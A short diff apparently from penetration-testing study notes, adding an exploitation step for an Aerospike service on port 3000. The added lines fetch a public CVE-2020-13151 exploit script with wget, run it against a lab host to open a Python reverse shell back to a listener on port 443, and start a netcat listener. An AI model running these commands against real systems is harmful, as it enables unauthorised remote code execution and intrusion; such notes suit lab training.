@@ -574,6 +574,9 @@ Aerospike Community Edition build 5.1.0.1
 ````
 ##### Exploitation
 ````
+wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
+python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443
+nc -nlvp 443
 ````
 #### MYSQL port 3306
 ##### Enumeration
